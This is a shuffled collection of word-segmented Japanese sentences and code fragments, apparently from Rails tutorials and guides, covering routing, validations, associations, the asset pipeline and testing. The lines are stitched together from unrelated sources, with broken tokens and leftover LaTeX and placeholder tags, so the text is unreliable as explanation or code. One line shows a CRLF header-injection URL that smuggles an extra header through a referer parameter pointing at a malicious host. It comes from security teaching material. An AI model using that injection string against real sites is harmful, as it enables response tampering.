「 / users 」 リクエスト は 、 Rails の ルーティング 機構   ( ルーター )   に よ っ て Users コントローラ 内 の \ kode {index } アクション に 割り当て られ る 。
最後 に 、 データベース を マイ グレート し ま す 。
*  `config▖ action_dispatch▖ default _headers ` は 、 HTTP ヘッダー で 使用 さ れ る ハッシュ で す ▟ この ヘッダー は デフォルト で すべて の レスポンス に 設定 さ れ ま す 。
### ` validates_associated `
Rails で 新規 プロジェクト を 作成 する と デフォルト で SQLite が 指定 さ れ ま す が 、 これ は いつ で も 後 から 変更 でき ま す 。
ミドルウェアスタック を 調べ る と 、 ` Rack : : Lock ` が 消え て い る こと が 分か り ま す 。
配列 や 範囲 オブジェクト と 同様 、 ハッシュ も \ kode {each } メソッド に 応答 し ま す 。
この 節 で は 、 フォロー し て い る ユーザー 数 に 応 じ て スケーリング でき る よう に 、 ステータス フィード を 再度 実装 し ま す 。
関連 付け の 詳細 情報
create  mode   100 6 44   README ▖ rdoc
この 節 で は 、 Asset   Pipeline の 概要 と 、 素晴らし い CSS 生成 ツール で あ る 「 \emph {Sass } 」 の 使 い 方 に つ い て 説明 し ま す 。
これ は リスト \ ref{ code : following _ followers_authorization_test } で 使用 さ れ て い ま し た 。
ブラック リスト を 元 に し て い る 限り 、 必ず 将来 漏れ が 生 じ ま す 。
置き換え た 結果 を { 0 } { 1 } リスト 4 ▖ 3 { / 1 } { / 0 } に 示 し ま す 。
*  `config▖ action_controller ▖ request _ forgery _ protection_token ` は 、 RequestForgery 対策 用 の トークン パラメータ 名 を 設定 し ま す 。
つまり 、 デコレータ は 手動 で require する 必要 が あ る と い う こと で す 。
第 一 に 、 丸 かっこ が あ り ま せ ん 。
run  Rails ▖ application ▖ routes
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/object/ deep_dup ▖rb ` で す 。
` : except ` オプション は 逆 に 、 指定 し た ルーティング のみ を 生成   _ しない _   よう 指示 し ま す 。
{ 0 } 図 12 ▖ 18 { / 0 }   { 1 } 別 の ユーザー の フォロワー を 表示 する { / 1 }
リスト \ ref{ code :user_edit_view } で 定義 さ れ た edit フォーム   ( 図 \ ref { fig : edit_ page } )   の HTML
`: if ` オプション は 、 特定 の 条件 で バリデーション を 行な う   * * べき で あ る * *   場合 に 使用 し ま す 。
図 \ ref { fig : micropost _length_error } に 示 し た とおり 、 マイクロ ポスト の 内容 が 長 すぎ る と い う \emph { エラー メッセージ } が Rails に よ っ て 表示 さ れ ま す
#   すぐ に メール 送信 し た い 場合 は # deliver_now を 使用
コントローラ 内 に アクション を 手作り する に は 、 単に コントローラ 内 で メソッド を 定義 すれ ば よ い の で す 。
Date:   Tue ,   12   Apr  2005   22 : 0 9 : 0 7   GMT
Ruby   on   Rails を 学習 中 !
この 節 で は 、 ユーザー に 最後 の 属性 を 追加 し ま す ▟ セキュア パスワード は 、 サンプル アプリケーション で ユーザー を 認証 する ため に 使用 し ま す 。
最後 に 、 この リファクタリング が 正常 に 行 わ れ た こと を 確認 する ため に 、 リファクタリング 前 と 同様 に テスト に パス する こと を 確認 し ま す 。
間違 っ た ユーザー が 編集 し よう と し た とき の テスト  
` pluralize ` と 逆 の 動作 で す 。
{ 0 } 図 7 ▖ 14 { / 0 } { 1 } ユーザー 登録 が 失敗 し た とき の モックアップ ▟ \ href { http://railstutorial ▖org / images/figures/signup _failure_mockup_bootstrap - full ▖ png } { ( 拡大 ) } { / 1 }
*   Rails   4 ▖ 0   で は ` Action Controller : : Base ▖ asset_path ` オプション が 廃止 さ れ ま し た 。
ユーザー 登録 フォーム の CSS
アカウント 有効 化 の HTML ビュー
  = >   6
###  シリアル 化 属性
ここ で は 、 Unix コマンド の \ kode {ls } で \ kode {app/controllers/} ディレクトリ の 中身 を 表示 し た 後 、 \ kode { rm } コマンド を うっかり 実行 し て この ディレクトリ を 削除 し て しま い ま し た 。
作成 し た コード を リスト \ ref{ code :sessions _helper_authenticate } に 示 し ま す
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/numeric/conversions ▖rb ` で す 。
CSS   ( 正確 に は SCSS で す が )   に も ちょっぴり 手 を 加え て お き ま しょ う   ( リスト \ ref{ code :user_ index_ css } ) 。
その 場合 、 アプリケーション コード は 正常 に 動作 し て も テスト が 正常 に 動作 し なく な り ま す 。
self を 省略 し た 結果 を リスト \ ref{ code :rspec_drb } に 示 し ま す 。
Article ▖ w here ( id :   10 ,   trashed :  false ) ▖ unscope ( w here :  : id )
アプリケーション に フック する
has_many 関連 付け の 図 ] ( images/has_many▖ png )
もう 1 つ の 方法 は 、 ユーザー 登録 の 項目 に 一意 の ユーザー 名 を \emph { 追加 } し 、 @replies で 使え る よう に する こと で す 。
test : mysql 2
  #  root   'welcome#index'
{ 0 } { 1 } 第 8 章 { / 1 } { / 0 } の 認証   ( authentication )   システム を 使 え ば 、 \emph {before_ action } を 使用 し て これ を 行え ま す 。
Article▖ joins(:category ,  : comments )
この 節 で 定義 する \ kode {belongs_to}/\kode { has_many } 関連 付け を 使用 する こと で 、 表 \ ref{table : association_methods } に 示 す よう な メソッド を Rails で 使え る よう に な り ま す 。
ここ で は 、 埋め込 み Ruby を 使 っ て \ kode { created\_at } カラム に 明示 的 に 値 を セット し て い る 点 に 注目 し て くださ い 。
( \ kode {rake   cucumber :ok } と 書 く こと も でき ま す ) 。
ドロップ ダウン メニュー と 新し い リンク が 表示 さ れ た ログ イン 中 の ユーザー
# => <option   value =" # { person ▖ id } ">#{ person ▖ name}</option >
新し い サニタイザ は 、 内部 で [ Loofah ] (https://github▖ com/flavorjones/loofah ) を 使用 し て い ま す 。
    attr_ internal   : log _ level
  @ routes =  Engine ▖ routes
\ kode { box\ _ sizing } ミックス イン を リスト \ ref{ code : mixin_and_debug } から 再 利用 し て い る こと に 注目 し て くださ い 。
created_at:  nil ,   updated_at:  nil >
メソッド の 1 行 目 で は まさに それ が 行 わ れ て い ま す   ( 取り出 し た い 属性 は ` params [ : article ] ` の 中 に あ り ま す ) 。
Heroku で は 、 サブ ドメイン の 他 に 独自 ドメイン も 使用 でき ま す
X : : Y: : Z ▖ parent_ name  # => " X : : Y "
     Article ▖ w here ( country :  country )
index ページ の 上部 に は ユーザー の 一覧 が 表示 さ れ ま す 。
その 次 の 行 に つ い て 説明 し ま す 。
   validates_with   GoodnessValidator
インデックス 名 を 変更 する ため だけ の マイ グレーション は 今後 不要 に な り ま し た 。
( 完全 な 正規 表現 )
Annotated   ( 1 ) :  User
それ に 続 く セクション に は 、 サイト の ロゴ を 表示 する \ kode {header } 、 ( \kode {div } タグ に よ る )   いく つ か の 領域 、 ナビゲーション リンク の リスト が あ り ま す 。
       create      app/views/users/edit▖html ▖erb
管理 者 から 見え る ページ を 図 \ ref { fig: index_ delete_links_rails _ 3 } に 示 し ま す 。
< a   href = " http://rubyonrails ▖org " > A  link</a>
# =>  Sun ,   28   Feb   2010   23 : 59 : 59   + 0000
use   Rack : : Runtime
今回 取り上げ た Sass の ネスト 機能 や 変数 機能 を 使 っ て SCSS ファイル を 全面 的 に 書き直 す と 、 リスト \ ref{ code : refactored _scss } の よう に な り ま す 。
上 の コード は 、 現在 の ユーザー が 特別 な ユーザー の 場合 、 その ユーザー が 製品 ページ を 見 る とき に 特別 な レイアウト を 適用 し ま す 。
-------------------------------------------------------------------------------
Date:   Sun ,   24   Aug  2014   20 : 28 : 45   GMT
これ で テスト スイート は   \ passing   に な る はず で す 。
     Y 1   = : y 1
スペース を 入れ る と 見栄え が 変わ る か も しれ ま せ ん が 、 \ ref{ sec : test ing_titles } で 触れ た よう に HTML は 重複 する 空白 を 無視 する の で どちら で も 大丈夫 で す 。
この サイト に ログ イン する に は 、 <%= @url  % > を クリック し て くださ い 。
作成 し た バリ データ が 複雑 に な っ て インスタンス 変数 を 使 い た く な っ た 場合 は 、 旧来 の Ruby オブジェクト を 簡単 に 使 う こと が でき ま す 。
   queue _as   do
Rails アプリケーション から 受け取 る すべて の HTTP レスポンス に は 、 以下 の セキュリティ ヘッダー が デフォルト で 含 ま れ て い ま す 。
以下 の よう に 、 数値 を 百 分 率 形式 の 文字 列 に 変換 でき ま す 。
    has_many  : products ,    dependent :  : destroy
#   ページ ごと の 完全 な タイトル を 返 し ま す 。
` Rails : : Rack : : Debugger ` は 主 と し て development 環境 で 役 に 立 ち ま す 。
Git   を バージョン 管理 に 使 っ て い る 場合 は 、 いつ も の よう に トピック ブランチ を 作成 し て お き ま しょ う 。
( なお 、 \ kode {id } パラメータ は Rails に よ っ て 自動 的 に \emph { 主キー } と し て データベース に 追加 さ れ る ため 、 追加 不要 で す ) 。
|                     |   409                | : conflict                         |
パスワード と パスワード 確認 を 追加 する   (  \ passing   )
#   SELECT   count (*)   AS   count_all   FROM   clients   WHERE   ( first _ name  =  'Ryan')
     following
カスタム バリ データ は ` validates_with ` メソッド を 使用 し て 呼び出 し ま す 。
Mpack は Web ブラウザ の セキュリティ ホール を 介 し て 邪悪 な ソフトウェア を インストール し よう と し ま す ▟ そして 攻撃 の 成功 率 は 50 % を 誇 っ て い ま す 。
( この 問題 を 指摘 いただ い た Jeremy   Fleischman に 感謝 し ま す ) 。
この ため 、 fields _ for は 同じ フォーム に 別 の モデル オブジェクト を 追加 する の に 向 い て い ま す 。
\ kode {rails   new } を 実行 する   ( バージョン 番号 を 指定 ) 。
特定 の 属性 のみ を 更新 し た い 場合 は 、 以下 の よう に \ kode {update_attribute } を 使 い ま す ▟ なお 、 update_attribute に は 検証 を 回避 する と い っ た 効果 も あ り ま す 。
多く の Web サイト は API  ( Application   Programmer  Interface )   を 公開 し て お り 、 第 三 者 の アプリケーション から リソース の get/post/put/ delete が 行え る よう に な っ て い ま す 。
この Git  configuration で 設定 する 名前 や メール アドレス は 、 今後 リポジトリ 上 で 一般 に 公開 さ れ ま す の で ご 注意 くださ い
     Proc▖ new  do  |html_tag ,   instance |
  #  それ が インク ルード さ れ て い る   ( article ▖ rb )   コンテキスト で 評価 する
* `: class_ name `
DELETE  /articles/: id ( ▖: format )        articles # destroy
d ▖end _of_ year             # =>  Fri ,   31   Dec  2010
{ 0 } { 1 } リスト 2 ▖ 1 { / 1 } { / 0 } の 内容 は { 2 } { 1 } リスト 1 ▖ 14 { / 1 }{ / 2 } と 同じ で す 。
追加 の gem を 含 ん だ \ kode { Gemfile } 。
yesterday
BEGIN
サーバー 側 で 考慮 す べ き 点
この メソッド は 、 前述 の ` ActiveRecord : : Base # invalid ? ` メソッド と は 異な り ま す ▟ この メソッド は オブジェクト 全体 の 正当 性 に つ い て は 確認 し な い ため で す 。
    dasherize ?   ?  
Rails の ドキュメント を 作成 する に あた り 、 ユーザー 向け の パブリック な API と 内部 API の 違い を 理解 し て お く こと が 重要 で す 。
    layout   'mailer'
この HTML は 以下 の よう な 感じ に な り ま す 。
リスト \ ref{ code : login_form } の コード を 使用 する と 、 図 \ ref { fig: login_form } の よう に ログ インフォーム が 表示 さ れ ま す
   if @ article ▖ update( article _params )
ここ で 必要 な の は 、 \ kode {microposts } テーブル から 、 ある ユーザー   ( つまり 自分 自身 )   が フォロー し て い る ユーザー に 対応 する id を 持 つ マイクロ ポスト を すべて 選択   ( select )   する こと で す 。
\ href { http://www ▖rubular▖ com/}{ Rubular } で ２ 〜 ３ 時間 ほど 遊 ん で み て くださ い 。
上 の コード の 出力 は 以下 の よう に な り ま す 。
    < ! [ endif ]
     config▖ to_prepare   do
` years_ since ` も 同じ 要領 で 、 その 年数 後 の 同じ 日付 を 返 し ま す 。
* ` ActionDispatch : : RemoteIp ` は IP スプー フィング 攻撃 が 行 わ れ て い な い か どう か を チェック し 、 リクエスト ヘッダー から 正し い ` client_ ip ` を 取得 し ま す 。
{ a :   1 } ▖ assert_valid _keys ( " a " )  #  ArgumentError
     respond_ with  @user
インストール の 際 に は 、 \ kode {bun dle  install } に 特殊 な フラグ を 追加 し ま す 。
|                     |   408                | : request_timeout                  |
-------------------------------------------
d ▖ beginning _ of _week          # =>  Mon ,   0 3   May  2010
それ 以外 の パス が 含 ま れ て い る 場合 は 例外 が 発生 し ま す 。
*  `assert_ routing `
DSL   ( ドメイン 固有 言語 )   で あ る ` shallow ` メソッド を ルーティング で 使用 する と 、 すべて の ネスト が 浅 く な る よう に 内側 に スコープ を 1 つ 作成 し ま す 。
ホ スト アプリケーション から 見 れ ば 、 自分 が 持 つ スタイル シート に `" blorgh/admin ▖css " ` を 追加 する 意味 は あ り ま せ ん 。
適切 な クラス 名 と 外部 キー と 一緒 に \ kode { has\_many}/\kode { has\_many : through } を 使 う こと で 、 能動 的 関係   ( フォロー する )   や 受動 的 関係   ( フォロー さ れ る )   が モデリング でき た
この オプション を オン に する と 、 それ ら の ファイル 送信 は Web サーバー に 一任 さ れ 、 それ に よ っ て 高速 化 さ れ ま す 。
create       test/controllers/blorgh/articles_controller_test ▖ rb
    "#{title } "
     conflict    config/ environment ▖ rb
    Join   Filter :  ( articles ▖user_ id   =   users ▖ id )
#     < id type =" integer " > 43 5 6 </ id >
    has _one   : account ,   inverse _of:  : supplier
NOTE :  ` has_many ` 関連 付け を 宣言 する 場合 、 相手 の モデル 名 は 「 複数 形 」 に する 必要 が あ り ま す 。
####  サブセット 条件
置き換え た 結果 を { 0 } { 1 } リスト 4 ▖ 3 { / 1 } { / 0 } に 示 し ま す 。
この 機能 が 必要 な 場合 は ` actionpack - xml _parser `   gem を 追加 する 必要 が あ り ま す 。
# => < input type =" hidden "   id= " user_token "   name = " user [ token ] "   value =" #{@user▖ token} "  />
Ajax を 理解 する に は 、 Web ブラウザ の 基本 的 な 動作 に つ い て 理解 し て お く 必要 が あ り ま す 。
Action   View が 提供 する ヘルパー の 概要
最初 の コード を リスト \ ref{ code :failed_ signin_attempt } に 示 し ま す   ( この コード は わざと 少し 間違え て あ り ま す ) 。
これ は 、 作成 する とき に オプション を 渡 す こと で 簡単 に カスタマイズ でき ま す 。
` exclusion ` ヘルパー の ` : in ` オプション に は 、 バリデーション を 行 っ た 属性 の 値 に 含め た く な い 値 の 集合 を 指定 し ま す 。
予期 し な かっ た 変更 が 発生 し た 場合 は 、 必ず 差分 を 十分 に チェック し て くださ い 。
\ kode { Gemfile } に Puma を 追加 する
フォロー / フォロワー ページ の 認可 を テスト する  
再度 テスト を 実行 する と 、 期待 どおり 失敗 し ま す 。
     params   =   Hash [ * params ▖ map  {|k ,   v|  [ k ,  v▖to_s ] }▖flatten ]
</ div>
In   Section   \ ref{ sec : showing _ users } , this   page   will   become  the  user’s   profile ▖
\ href {https://twitter▖ com/colmtuite } { Colm   Tuite } の 多大 な 貢献 に よ り 、 サンプル アプリケーション を Bootstrap   CSS の フレームワーク に � 変換 する こと が でき ま し た ▟ 感謝 し ま す 。
次 に 、 本番 データベース で マイグレーション を 実行 し 、 Heroku に User データ モデル を 使用 する こと を 通知 し ま す 。
「 forgot   password 」 リンク の モックアップ
ブラウザ は 、 サーバー から 受け取 っ た レスポンス を 解析 し 、 続 い て 必要 な すべて の アセット   ( Java Script ファイル 、 スタイル シート 、 画像 )   を サーバー から 取得 し ま す 。
| `{  " person " :  [null ]  }`            | `{ : person  => nil  }`     |
ビデオ タグ で は 、 ` id ` や ` class ` など の HTML オプション を 末尾 で 自由 に 指定 する こと も でき ま す 。
     Rails ▖ application ▖ routes▖draw   do
例 :
第 \ ref { cha : rails_flavored _ruby } 章 と 同じく 、 Rails コンソール を 使用 し て データ モデル を 調べ て み ま しょ う 。
各 フォルダ の イニシャライザ は アルファベット 順 に 読み込 ま れ ま す 。
作成 し た コード を リスト \ ref{ code : signin_after_ signup_test } に 示 し ま す
Home ページ で 使用 し た の と 同じ 方法 で 、 Help 、 About 、 Contact ページ の テスト を 単純 化 する こと が でき ま す 。
一意 性 を 強制 する と 何 が 起き る か に つ い て 関心 の あ る 方 は 、 \ kode {db /schema▖ rb } を 開 い て み る と 以下 の よう な 行 が あ る はず で す 。
╼╼  \ section { セッション }╼  \ label{ sec : sessions_and _failed_ login }╼╼
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/string/access▖rb ` で す 。
M ▖ reachable ?  
    <%=  f▖ text _ area   : text   %>
それ で は 、 Ruby   on   Rails の 開発 環境 を 構築 し 、 最初 の アプリ を 作成 し て み ま しょ う 。
以下 の 作業 を 行 う に は 、 メイン の Rails リポジトリ を 指 す Git リモート を 取得 する 必要 が あ り ま す 。
NOTE :   ハッシュ に よ る 条件 は 、 等値 、 範囲 、 サブセット の チェック で のみ 使用 でき ま す 。
//= require  core
リスト \ ref{ code : minitest _ reporters } の コード に は 、 シングル クオーテーション   (')   と ダブル クオーテーション   ( " )   の 両方 が 含 ま れ て い ま す 。
  @ article   =   Article▖ new ( params [ : article ] )
    wrap_parameters  format: [ : json ]
続 い て 、 ` app/views/articles/show ▖html ▖erb ` の 内容 を 以下 の よう に 変更 し ま しょ う 。
セキュリティ に は 十分 注意 し て くださ い ▟ 認可 さ れ た ユーザー に のみ API アクセス を 許可 する 必要 が あ り ま す 。
リスト \ ref{ code : password _ migration } で は 、 \ kode { add\_ column } メソッド を 使 っ て \ kode { users } テーブル \ kode { password\_digest } カラム を 追加 し て い ま す 。
ユーザー の \ kode { show } ビュー に サイド バー を 追加 する
文字 列 を シャッフル する 関数 の 骨組み 。
####  単一 関連 付け を 結合 する
* `belongs_to `
上 の コード が 動作 する ため に 必要 な � パスワード 再 設定 用 メイラー メソッド は 、 \ ref{ sec : account_activation_mailer } で 開発 し た アカウント 有効 化 用 メイラー メソッド と ほぼ 同じ で す 。
同じ バリデーション に 対 し て 、 `: if ` また は ` :unless ` の どちら で も 使用 でき ま す 。
I   shall  be   late ! " ▖ truncate ( 18 )
つまり 、 Java Script が オフ に な っ て い る と ユーザー 削除 の リンク も 無効 に な る と い う こと で す 。
現状 の サンプル アプリケーション に は 、 ユーザー が パスワード を 忘れ て しま っ た とき の 復旧 手段 が あ り ま せ ん 。
flash ▖keys # => [ " string " ,  "symbol " ]
http://www▖ yourapplication▖ com/controller/action ? referer = http://www ▖malicious ▖tld % 0 d % 0 aX - Header : + Hi !
\ kode { log _out } メソッド を Sessions コントローラ の \ kode { destroy } アクション で も 同様 に 使用 し ま す   ( リスト \ ref{ code : destroy_ session } ) 。
    cookies▖encrypted [ : expiration_date ]  =  Date▖ tomorrow  # =>  Thu ,   20   Mar  2014
デフォルト は ` : scaffold_controller ` で す 。
*   [ jquery -ujs wiki ] (https://github▖ com/rails/jquery -ujs/wiki )
Help ページ 用 に 生成 さ れ た ビュー
これ ら の ディレクトリ に は 、 それぞれ の アセット クラス 用 の サブ ディレクトリ が あ り ま す ▟ たとえば 、 app/assets に は 次 の よう な サブ ディレクトリ が あ り ま す 。
たとえば 、 リスト \ ref{ code :typography_css } や リスト \ ref{ code : footer_css } を 見 て み る と 、 同じ 色 を 繰り返 し 参照 し て い る 箇所 が あ り ま す 。
# => < input type = " file "   id= " user_ avatar "   name = " user [ avatar ] "  />
リスト \ ref{ code : password _ resets_resource } の コード は RESTful の ルーティング   ( 表 \ ref{table : RESTful_ password _ resets} )   に 従 っ て い ま す 。
*  `orm ` は 、 使用 する ORM   ( オブジェクト リレーショナル マッピング )   を 指定 し ま す 。
\ ref{ sec : layout_link_tests } で も 指摘 し た よう に 、 HTML 構造 を 網羅 的 に チェック する テスト は 壊れ やす く 、 生産 性 を 逆 に 落と し か ね な い から で す 。
Active   Record は これ ら の メソッド を 自動 的 に 作成 し 、 これ に よ っ て アプリケーション は テーブル に 保存 さ れ て い る データ を 操作 する こと が でき ま す 。
有効 な メール アドレス か どう か （ ドット が ２ つ 以上 連続 する か どう か ） を 検証 する 正規 表現
ruby   2 ▖ 0 ▖ 0 p 353
適切 な オプション   ( `: media ` , `:rel` )   を 使用 する こと で 、 これ ら の デフォルト 値 を 上書き でき ま す 。
テスト が 緑色 に な っ た の で 、 安心 し て コード を リファクタリング でき る よう に な り ま し た 。
この 場合 、 関連 付け は 次 の よう な 感じ に な る で しょ う 。
  = >  52 4 288 0
メイル 送信用 の コード の どこ か で 、 以下 の よう な 感じ で ロケール 依存 ビット を グループ 化 する こと が でき ま す 。
git   add : "▖ "
次 の 章 に 進 む 前 に 、 差分 を コミット し て マスター ブランチ に マージ し て お き ま しょ う 。
###  ダイジェスト を オフ に する
この ため 、 ` : minimum ` を 1 に 設定 する の で あ れ ば メッセージ を カスタマイズ し て 単数 形 に する か 、 代り に ` presence :  true ` を 使用 し ま す 。
#   Active   Record の モデル を マス アサインメント から 保護 する ため に 例外 を 発生 する
Oh   dear ! ▖▖▖ "
   " :: X " ▖ constantize # => : in_Object
  @ article   =   Article ▖find ( params [ : article _ id ] )
( ブラウザ 上 で 画面 を 右 クリック し 、 インスペクター で 要素 を 調べ る と 確認 でき ま す ) 。
d ▖ next _ week              # =>  Mon ,   10   May  2010
これ で 、 \ ref{ code :user_ follow _ form _profile_stats } の よう に フォロー 用 の フォーム を ユーザー プロファイル ページ に インク ルード し て パーシャル を 出力 でき る よう に な り ま し た 。
詳細 に つ い て は 、 [ アセット パイプライン ] ( asset_pipeline ▖html ) ガイド を 参照 し て くださ い 。
ただし 、 この よう に 明示 的 に 引数 を 与え て お け ば 、 コード の 意図 を Rails と 開発 者 に 明確 に 示 す こと が でき ま す ) 。
#### Builder テンプレート
レイアウト ごと に 異な る 外観 を 設定 し て これ ら を 使い分け る こと が でき ま す 。
( \ kode {before } メソッド は 、 別名 で も あ る \ kode {before(:each ) } で 呼 ぶ こと も でき ま す ) 。
削除 リンク と ユーザー 削除 に 対 する 統合 テスト  
[ Rails   API   ドキュメント ] ( http://api▖ rubyonrails ▖org ) は [ RDoc ] ( http://docs▖ seattlerb ▖org / rdoc/ ) を 使用 し て 生成 さ れ ま す 。
この 数値 を 変更 し た い 場合 は ` statement_ limit ` に 別 の 数値 を 指定 し ま す 。
* : polymorphic
セキュリティ 上 の 理由 から HTML 以外 の テキスト フォーマット 機能 を 提供 し た い の で あ れ ば 、 何 ら か の マーク アップ 言語 を 採用 し 、 それ を サーバー 側 で HTML に 変換 する よう に し て くださ い 。
### ` to_ param `
いずれ の 場合 も 、 名前 付き ルート   ( named  route ) は 、 `scope ` を 使用 し な かっ た 場合 と 同じ で あ る こと に ご 注目 くださ い 。
Rails   4 ▖ 1 から は ` ActiveSupport: : Callbacks▖set_callback ` の 呼び出し の 際 に 明示 的 に ブロック を 渡 す こと が 期待 さ れ ま す 。
ユーザー の データ モデル
Micropost データ モデル
上 の 例 で は 、 ` Client ` テーブル が 空 なら ` false ` を 返 し 、 それ 以外 の 場合 は ` true ` を 返 し ま す 。
>> p ▖save !
   def  update
パスワード の 再 設定 が 失敗 し た 場合
ユーザー の リレーションシップ を 削除 し て フォロー 解除 する 。
` delegate ` マクロ を 使用 する と 、 メソッド を 簡単 に 委譲 でき ま す 。
ターミナル で ` rake   routes ` コマンド を 実行 し て も 同じ 結果 を 得 られ ま す 。
次 に \ kode { git   add   - A } を 実行 し 、 プロジェクト の ファイル を リポジトリ に 追加 し ま す 。
それ 以外 の アクション で あ れ ば 、 配列 の 最初 の 要素 に アクション 名 を 挿入 する だけ で 済 み ま す 。
def undecorated_table_name ( class_ name  =  base_class▖ name )
Active   Record オブジェクト を ひとたび 取得 する と 、 オブジェクト の 属性 を 変更 し て データベース に 保存 でき る よう に な り ま す 。
Rails   3 ▖ 2 へ の アップグレード で は 必須 で は あ り ま せ ん が 、 今 の うち に プラグ イン を gem に エクスポート し て Gemfile に 追加 する の が よ い で しょ う 。
\ kode { picture } を 許可 さ れ た 属性 の リスト に 追加 する
config▖ mid dleware ▖ delete   " ActionDispatch : : Session : : CookieStore "
#### ` humanize`
   <option   value = " 2 " > D ▖   Thomas < /option >
|     1   |   SIMPLE       |  users  |  const   |  PRI MARY       |
   validates_with   GoodnessValidator ,  fields : [ : first _ name , : last_ name ]
特定 の 属性 のみ を 更新 し た い 場合 は 、 以下 の よう に \ kode {update\_attribute } を 使 い ま す ▟ なお 、 update\_attribute に は 検証 を 回避 する と い っ た 効果 も あ り ま す 。
これ を 避け る に は 、 データベース の 両方 の カラム に 一意 インデックス を 作成 する 必要 が あ り ま す 。
この サンプル アプリケーション に は 独自 の ユーザー ログ イン が な い の で 、 ユーザー を 一意 に 表 す 方法 も 考え な けれ ば な ら な い で しょ う 。
パスワード の 長 さ と \ kode {authenticate } メソッド を テスト する 。
次 に 、 リスト \ ref{ code :universal_css } に 示 し た よう に 、 Web サイト 全体 に わた っ て レイアウト と 個別 の ページ に スタイル を 与え る ため の CSS を 追加 し ま す 。
person   =   Person ▖ create ( name :  ' Honda ')
*  `collection ▖ destroy (object ,  ▖▖▖)
事実 上 、 すべて の Web アプリケーション は 何 ら か の ログ イン / 認証 システム を 必要 と し ま す 。
注意 :   この 名前 は 、 著者 の サンプル アプリケーション で 既に 使用 し て い ま す の で 、 「 必ず 他 の 名前 を 使用 し て くださ い 」 。
\ begin {equation}╼\ label{ eq : delta_p}╼\ Delta t_r = t_N - t_r╼\end { equation }
以下 の HTML が 生成 さ れ ま す 。
コンソール で 遊 ん で みたい の で あ れ ば 、 ` rails  console ` で Rails アプリケーション を コンソール で 動かせ ま す 。
Rails   4 ▖ 2 から は 、 \ texttt { byebug }   gem を 使 っ て もっと 直接 的 に デバッグ でき る よう に な り ま し た   ( リスト \ ref{ code : gemfile_ sample_app } ) 。
{ 0 } 図 2 ▖ 7 { / 0 }   { 1 } ユーザー 編集 用 の ページ   ( \ href { http://0 ▖ 0 ▖ 0 ▖ 0 : 3000 / users / 1/edit} {/ users / 1/edit} ) { / 1 }
####  スペーサー テンプレート
これ を 実現 する ため に 、 ユーザー ごと に 一意 かつ 安全 な 記憶 トークン を 生成 し 、 ブラウザ を 閉じ て も 無効 に な ら な い \emph { 恒久 的 な } cookies と し て 登録 し ま す 。
マイクロ ポスト の ページ ネーション の テスト を 追加 し て くださ い 。
   scope   : published ,  -> {  w here ( published:  true )   }
` exclude ? ` 述語 は 、 与え られ た オブジェクト が その コレクション に 属 し て   * * いな い * *   かどう か を テスト し ま す 。
create    app/models/blorgh/article ▖ rb
    host :   local host
で は 、 次 の 式 の 値 は 何 で す か ？
" 2010 - 0 7 - 27   23 : 42 : 0 0 " ▖ to_time(:utc)    # =>  Tue   Jul  27   23 : 42 : 0 0   UTC  2010
フレンド リー フォワーディング を 備え た \ kode { create } アクション
    some_code
unless  params [ : token ] ▖ nil ?
Ruby に お け る 基本 的 な オブジェクト の 一部 は singleton オブジェクト で す 。
新し い \ kode { README } ファイル 「 \ kode { README ▖ md } 」 の 内容 。
<span>
この レイアウト は 、 コレクション 内 の 各 項目 を レンダリング する たび に 一緒 に レンダリング さ れ ま す 。
あるいは エディタ の [ File ] メニュー で ファイル を 作成 し て 、 この ディレクトリ に 保存 し て も 構 い ま せ ん 。
{ 0 } 図 12 ▖ 8 { / 0 }   { 1 } Relationship データ モデル { / 1 }
Rails コンソール を 使用 する と 、 コマンドライン から Rails アプリケーション と やりとり する こと が でき る 。
この 問題 を 解決 する に は 、 それ に 対応 する ` Articles Controller ` を 作成 すれ ば よ い の で す 。
上 に 対応 する 3 つ の メソッド を 持 つ 、 モデル の 属性 の 別名   ( alias )   を 一 度 に 作成 する こと が でき ま す 。
Action   Dispatcher 内部 の コンポーネント の 多く は 、 Rack の ミドルウェア と し て 実装 さ れ て い ま す 。
since   ( in )
ハッシュ 化 さ れ た パスワード は 、 \emph { 暗号 化 さ れ た パスワード } と よく 誤解 さ れ がち で す 。
最後 の 例 で わか る よう に 、 ` const_defined ? ` メソッド と 同様 に 2 番 目 の 引数 は デフォルト で true に な り ま す 。
        require_dependency ( c )
リスト \ ref{ code : password _ reset_form } の とき
#   If  true ,   the  base  class   of anonymous   controllers  will   be  inferred
  <strong > Comment: </strong >
\ kode {User } クラス に おけ る 継承 。
たった 12 行 で ここ まで の 機能 が 実装 でき た こと は 、 ( Rails の )   注目 に 値 する 点 で も あ り ま す 。
もし 体系 化 さ れ た カリキュラム や インストラクター に よ る フィードバック が 欲し けれ ば 、 Tealeaf は 良 い 選択 肢 と な り 得 る で しょ う 。
self を 省略 し た 結果 を リスト \ ref{ code : admin _factory } に 示 し ま す 。
なお 、 \emph { Rails チュートリアル } で は 、 \ kode { path } 書式 を 使用 する 一般 的 な 規約 に 従 い 、 リダイレクト の 場合 のみ \ kode {url} 書式 を 使用 し ま す 。
+ ---- +------------- +---------- +------- +--------------- +
従来 の 伝統 的 な HTML スキャン に よ る サニ タイズ は 公式 に 非 推奨 化 さ れ ま し た ▟ 現在 推奨 さ れ る 方法 は [ ` Rails   HTML サニタイザ ` ] (https://github▖ com/rails/rails -html - sanitizer ) で す 。
< a   href = " # "   onclick = " paintIt( this ,  '# 009900 ' ,  '# FFFFFF ' ) " > Paint  it  green </a>
TIP:   Web サーバー を 停止 する に は 、 実行 さ れ て い る ターミナル の ウィンドウ で Ctrl   +   C キー を 押 し ま す 。
#### ` javascript_ include_tag ` を 使用 し て Java Script ファイル に リンク する
  $ ▖/configure  && make  && sudo  make  install
` mass_assignment_sanitizer ` 設定 を ` config/ environments/test ▖ rb ` に も 追加 する 必要 が あ り ま す 。
100 ▖ to_s(:percentage)
$  cd blog
条件
\emph { 注 } :   今後 Heroku で 何 ら か の 本番 アプリケーション を 運用 する 予定 が あ る なら 、 \ ref{ sec : professional_grade_deployment } の production 用 Web サーバー の 設定 に 必ず 従 っ て くださ い 。
53 ▖ordinalize   # =>  " 53 rd "
まず は Micropost リソース の 最も 本質 的 な 部分 を 表現 する Micropost モデル を 作成 する ところ から 始め ま しょ う 。
また 、 ユーザー を アンフォロー する とき も 構造 は ほとんど 同じ で 、 \ kode { post } メソッド を \ kode { delete } メソッド に 置き換え て テスト し ま す 。
" helpers/#{ module_ path}_helper "
